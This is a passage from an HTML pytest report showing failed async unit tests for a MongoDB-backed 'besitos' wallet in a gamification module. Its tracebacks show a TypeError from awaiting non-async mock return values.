)<br/>    <br/>                    if not user_doc:<br/>                        # Create user if doesn&#x27;t exist<br/>                        balance_before = 0<br/>                        await self.users_collection.update_one(<br/>                            {&quot;user_id&quot;: user_id},<br/>                            {<br/>                                &quot;$setOnInsert&quot;: {<br/>                                    &quot;user_id&quot;: user_id,<br/>                                    &quot;besitos_balance&quot;: 0,<br/>                                    &quot;created_at&quot;: datetime.utcnow(),<br/>                                    &quot;updated_at&quot;: datetime.utcnow()<br/>                                }<br/>                            },<br/>                            upsert=True,<br/>                            session=session<br/>                        )<br/>                    else:<br/>                        balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    balance_after = balance_before + amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.AWARDED,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=source,<br/>                        reference_id=reference_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully added %d besitos to user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_added event (requirement 2.1)<br/>                await self._publish_besitos_added_event(<br/>                    user_id, transaction_id, amount, reason, source, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to add besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:198: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:197 Unexpected error adding besitos to user test_user_123: object dict can&#x27;t be used in &#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_add_besitos_new_user</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8ea7680&gt;<br/>user_id = &#x27;new_user_456&#x27;, amount = 50, reason = &#x27;Welcome bonus&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object NoneType can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:113: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f5040&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8ea7680&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537615150256&#x27;&gt;<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537618854832&#x27;&gt;<br/>mock_session = &lt;Mock name=&#x27;mock._db.client.start_session().__aenter__()&#x27; id=&#x27;137537618865872&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_add_besitos_new_user(self, besitos_wallet, mock_mongodb_handler, mock_event_bus, mock_session):<br/>        &quot;&quot;&quot;Test adding besitos to a new user (user document doesn&#x27;t exist).&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;new_user_456&quot;<br/>        amount = 50<br/>        reason = &quot;Welcome bonus&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>        mock_transactions_collection = mock_mongodb_handler.get_besitos_transactions_collection.return_value<br/>    <br/>        # Mock user document not found<br/>        mock_users_collection.find_one.return_value = None<br/>    <br/>        # Mock session context manager<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__.return_value = mock_session<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>    <br/>        # Act<br/>&gt;       result = await besitos_wallet.add_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:117: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8ea7680&gt;<br/>user_id = &#x27;new_user_456&#x27;, amount = 50, reason = &#x27;Welcome bonus&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/>    <br/>                    if not user_doc:<br/>                        # Create user if doesn&#x27;t exist<br/>                        balance_before = 0<br/>                        await self.users_collection.update_one(<br/>                            {&quot;user_id&quot;: user_id},<br/>                            {<br/>                                &quot;$setOnInsert&quot;: {<br/>                                    &quot;user_id&quot;: user_id,<br/>                                    &quot;besitos_balance&quot;: 0,<br/>                                    &quot;created_at&quot;: datetime.utcnow(),<br/>                                    &quot;updated_at&quot;: datetime.utcnow()<br/>                                }<br/>                            },<br/>                            upsert=True,<br/>                            session=session<br/>                        )<br/>                    else:<br/>                        balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    balance_after = balance_before + amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.AWARDED,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=source,<br/>                        reference_id=reference_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully added %d besitos to user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_added event (requirement 2.1)<br/>                await self._publish_besitos_added_event(<br/>                    user_id, transaction_id, amount, reason, source, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to add besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object NoneType can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:198: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:197 Unexpected error adding besitos to user new_user_456: object NoneType can&#x27;t be used in &#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_add_besitos_database_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d17000b4890&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 100, reason = &#x27;Test reward&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:113: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f5370&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d17000b4890&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537758366464&#x27;&gt;<br/>mock_session = &lt;Mock name=&#x27;mock._db.client.start_session().__aenter__()&#x27; id=&#x27;137537738458608&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_add_besitos_database_error(self, besitos_wallet, mock_mongodb_handler, mock_session):<br/>        &quot;&quot;&quot;Test handling of database errors when adding besitos.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        amount = 100<br/>        reason = &quot;Test reward&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>    <br/>        # Mock user document<br/>        mock_users_collection.find_one.return_value = {&quot;besitos_balance&quot;: 50}<br/>    <br/>        # Mock session context manager<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__.return_value = mock_session<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>    <br/>        # Mock database error<br/>        mock_users_collection.update_one.side_effect = PyMongoError(&quot;Database error&quot;)<br/>    <br/>        # Act &amp; Assert<br/>        with pytest.raises(TransactionError):<br/>&gt;           await besitos_wallet.add_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:165: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d17000b4890&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 100, reason = &#x27;Test reward&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/>    <br/>                    if not user_doc:<br/>                        # Create user if doesn&#x27;t exist<br/>                        balance_before = 0<br/>                        await self.users_collection.update_one(<br/>                            {&quot;user_id&quot;: user_id},<br/>                            {<br/>                                &quot;$setOnInsert&quot;: {<br/>                                    &quot;user_id&quot;: user_id,<br/>                                    &quot;besitos_balance&quot;: 0,<br/>                                    &quot;created_at&quot;: datetime.utcnow(),<br/>                                    &quot;updated_at&quot;: datetime.utcnow()<br/>                                }<br/>                            },<br/>                            upsert=True,<br/>                            session=session<br/>                        )<br/>                    else:<br/>                        balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    balance_after = balance_before + amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.AWARDED,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=source,<br/>                        reference_id=reference_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=amount,<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully added %d besitos to user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_added event (requirement 2.1)<br/>                await self._publish_besitos_added_event(<br/>                    user_id, transaction_id, amount, reason, source, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to add besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error adding besitos to user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:198: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:197 Unexpected error adding besitos to user test_user_123: object dict can&#x27;t be used in &#x27;await&#x27; expression<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_spend_besitos_success</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8e9da90&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 30, reason = &#x27;Item purchase&#x27;, item_id = None<br/>reference_id = None, metadata = {}<br/><br/>    async def spend_besitos(self, user_id: str, amount: int, reason: str,<br/>                           item_id: Optional[str] = None, reference_id: Optional[str] = None,<br/>                           metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Spend besitos from user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.2: WHEN besitos are spent THEN the system<br/>        SHALL validate balance and publish besitos_spent events.<br/>    <br/>        Args:<br/>            user_id: User ID to spend besitos from<br/>            amount: Amount of besitos to spend (must be positive)<br/>            reason: Reason for spending besitos<br/>            item_id: Optional item ID if spending on an item<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            InsufficientFundsError: If user doesn&#x27;t have enough besitos<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Spending %d besitos from user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance and validate<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:237: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f5520&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8e9da90&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537619439408&#x27;&gt;<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537620202736&#x27;&gt;<br/>mock_session = &lt;Mock name=&#x27;mock._db.client.start_session().__aenter__()&#x27; id=&#x27;137537618828448&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_spend_besitos_success(self, besitos_wallet, mock_mongodb_handler, mock_event_bus, mock_session):<br/>        &quot;&quot;&quot;Test successful spending of besitos from user wallet.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        amount = 30<br/>        reason = &quot;Item purchase&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>        mock_transactions_collection = mock_mongodb_handler.get_besitos_transactions_collection.return_value<br/>    <br/>        # Mock user document with sufficient balance<br/>        mock_users_collection.find_one.return_value = {&quot;besitos_balance&quot;: 100}<br/>    <br/>        # Mock session context manager<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__.return_value = mock_session<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>    <br/>        # Act<br/>&gt;       result = await besitos_wallet.spend_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:187: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8e9da90&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 30, reason = &#x27;Item purchase&#x27;, item_id = None<br/>reference_id = None, metadata = {}<br/><br/>    async def spend_besitos(self, user_id: str, amount: int, reason: str,<br/>                           item_id: Optional[str] = None, reference_id: Optional[str] = None,<br/>                           metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Spend besitos from user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.2: WHEN besitos are spent THEN the system<br/>        SHALL validate balance and publish besitos_spent events.<br/>    <br/>        Args:<br/>            user_id: User ID to spend besitos from<br/>            amount: Amount of besitos to spend (must be positive)<br/>            reason: Reason for spending besitos<br/>            item_id: Optional item ID if spending on an item<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            InsufficientFundsError: If user doesn&#x27;t have enough besitos<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Spending %d besitos from user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance and validate<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/>    <br/>                    if not user_doc:<br/>                        logger.warning(&quot;User %s not found for spending transaction&quot;, user_id)<br/>                        raise InsufficientFundsError(f&quot;User {user_id} not found&quot;)<br/>    <br/>                    balance_before = user_doc.get(&quot;besitos_balance&quot;, 0)<br/>    <br/>                    # Validate balance (requirement 2.2)<br/>                    if balance_before &lt; amount:<br/>                        logger.warning(&quot;Insufficient funds for user %s: has %d, needs %d&quot;,<br/>                                     user_id, balance_before, amount)<br/>                        raise InsufficientFundsError(<br/>                            f&quot;Insufficient funds: has {balance_before}, needs {amount}&quot;<br/>                        )<br/>    <br/>                    balance_after = balance_before - amount<br/>    <br/>                    # Update user balance<br/>                    await self.users_collection.update_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {<br/>                            &quot;$set&quot;: {<br/>                                &quot;besitos_balance&quot;: balance_after,<br/>                                &quot;updated_at&quot;: datetime.utcnow()<br/>                            }<br/>                        },<br/>                        session=session<br/>                    )<br/>    <br/>                    # Create transaction record<br/>                    transaction_doc = BesitosTransaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        type=TransactionType.SPENT,<br/>                        amount=-amount,  # Negative for spending<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED,<br/>                        reason=reason,<br/>                        source=&quot;spending&quot;,<br/>                        reference_id=reference_id or item_id,<br/>                        metadata=metadata,<br/>                        completed_at=datetime.utcnow()<br/>                    )<br/>    <br/>                    await self.transactions_collection.insert_one(<br/>                        transaction_doc.dict(),<br/>                        session=session<br/>                    )<br/>    <br/>                    # Transaction completed successfully<br/>                    transaction = Transaction(<br/>                        transaction_id=transaction_id,<br/>                        user_id=user_id,<br/>                        amount=-amount,  # Negative for spending<br/>                        balance_before=balance_before,<br/>                        balance_after=balance_after,<br/>                        status=TransactionStatus.COMPLETED<br/>                    )<br/>    <br/>                logger.info(&quot;Successfully spent %d besitos from user %s (balance: %d -&gt; %d)&quot;,<br/>                           amount, user_id, balance_before, balance_after)<br/>    <br/>                # Publish besitos_spent event (requirement 2.2)<br/>                await self._publish_besitos_spent_event(<br/>                    user_id, transaction_id, amount, reason, item_id, balance_after<br/>                )<br/>    <br/>                return transaction<br/>    <br/>            except InsufficientFundsError:<br/>                # Re-raise insufficient funds error without wrapping<br/>                raise<br/>            except PyMongoError as e:<br/>                logger.error(&quot;Database error spending besitos for user %s: %s&quot;, user_id, str(e))<br/>                raise TransactionError(f&quot;Failed to spend besitos: {str(e)}&quot;)<br/>            except Exception as e:<br/>                logger.error(&quot;Unexpected error spending besitos for user %s: %s&quot;, user_id, str(e))<br/>&gt;               raise BesitosWalletError(f&quot;Unexpected error: {str(e)}&quot;)<br/><span class="error">E               src.modules.gamification.besitos_wallet.BesitosWalletError: Unexpected error: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:320: BesitosWalletError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.gamification.besitos_wallet:besitos_wallet.py:319 Unexpected error spending besitos for user test_user_123: object dict can&#x27;t be used in 